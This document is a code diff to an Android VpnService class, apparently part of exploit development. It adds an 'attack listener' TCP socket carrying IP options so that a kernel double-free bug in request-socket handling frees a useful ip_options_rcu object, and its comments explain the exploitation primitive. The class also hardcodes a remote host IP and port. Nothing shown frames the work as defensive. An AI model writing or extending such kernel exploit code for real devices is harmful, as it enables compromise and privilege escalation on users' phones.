@@ -60,6 +60,15 @@ public class InjService extends VpnService {
     private static final int LISTEN_PORT = 47100;
     private static final int LISTEN_BACKLOG = 128;
 
+    /**
+     * Port for the listener that carries IP options.
+     *
+     * Kept separate from LISTEN_PORT so the plain java.net listener can stay in
+     * place for the control path while this one is specifically shaped for the
+     * request socket bug.
+     */
+    private static final int ATTACK_PORT = 47500;
+
     private static final String CLOUD_HOST = "5.180.98.79";
     private static final int CLOUD_PORT = 45700;
     private static final int CONNECT_TIMEOUT_MS = 10000;
@@ -85,9 +94,12 @@ public class InjService extends VpnService {
     private volatile int stageSeq = 0;
     private final AtomicInteger stageDone = new AtomicInteger(0);
     private final Object stageLock = new Object();
-
     private ParcelFileDescriptor tun;
     private ServerSocket listener;
+
+    /** Raw fd of the listener that carries IP options; -1 until establish() runs. */
+    private volatile int attackFd = -1;
+
     private Thread pump;
     private Thread drainer;
     private Thread acceptor;
@@ -262,12 +274,15 @@ public class InjService extends VpnService {
 
 
     /**
-     * Report what the native layer can reach once the tunnel is up.
+     * Build the attack listener: a TCP socket on the tun endpoint that already
+     * carries a 40 byte IP option.
      *
-     * Two things matter here: whether a socket can carry IP_OPTIONS at all
-     * (that is the object the bug lives on), and whether the tun endpoint is
-     * bindable from this process. The result goes to a file because the log
-     * ring on this device is short enough to lose it before anyone reads it.
+     * This is the piece the whole exercise needed. A java.net.ServerSocket
+     * cannot carry IP_OPTIONS, so its request sockets all had ireq_opt == NULL
+     * and the double free released nothing interesting. With the option in
+     * place, every SYN to this port makes tcp_v4_save_options() build an
+     * ip_options_rcu on the request socket, and that object is what the
+     * own_req == false path frees twice.
      */
     private void probeNative() {
         StringBuilder sb = new StringBuilder();
@@ -275,7 +290,7 @@ public class InjService extends VpnService {
         try {
             int[] udp = Native.makeUdp(0x4a4b4c4d);
             if (udp == null) {
-                sb.append("makeUdp failed\n");
+                sb.append("udp: failed\n");
             } else {
                 sb.append("udp: ").append(Native.readOptions(udp[0])).append('\n');
                 Native.closeFd(udp[0]);
@@ -285,27 +300,24 @@ public class InjService extends VpnService {
         }
 
         try {
-            int port = 47300 + (int) (System.currentTimeMillis() % 200);
-            int[] made = Native.makeListener(TUN_ADDRESS, port);
-            if (made != null && made[0] >= 0) {
-                sb.append("tun: fd=").append(made[0]).append(" ").append(TUN_ADDRESS)
-                        .append(':').append(port).append('\n');
+            int[] made = Native.makeListener(TUN_ADDRESS, ATTACK_PORT);
+            if (made == null || made[0] < 0) {
+                sb.append("attack: bind failed errno=")
+                        .append(made == null ? -1 : made[1]).append('\n');
+            } else {
+                attackFd = made[0];
+                sb.append("attack: fd=").append(attackFd).append(' ')
+                        .append(TUN_ADDRESS).append(':').append(ATTACK_PORT).append('\n');
 
-                // Put the options object on this listener. Any TCP child it
-                // grows inherits this via ireq->ireq_opt, which is the object
-                // the double free is about.
-                int rc = Native.applyOptions(made[0], 0x51525354);
+                int rc = Native.applyOptions(attackFd, 0x51525354);
                 sb.append("applyOptions: ").append(rc).append('\n');
 
                 if (rc == 0) {
-                    sb.append("readback: ").append(Native.readOptions(made[0])).append('\n');
+                    sb.append("readback: ").append(Native.readOptions(attackFd)).append('\n');
                 }
-            } else {
-                sb.append("tun: failed errno=")
-                        .append(made == null ? -1 : made[1]).append('\n');
             }
         } catch (Throwable t) {
-            sb.append("tun error: ").append(t).append('\n');
+            sb.append("attack error: ").append(t).append('\n');
         }
 
         Log.i(TAG, "probe:\n" + sb);
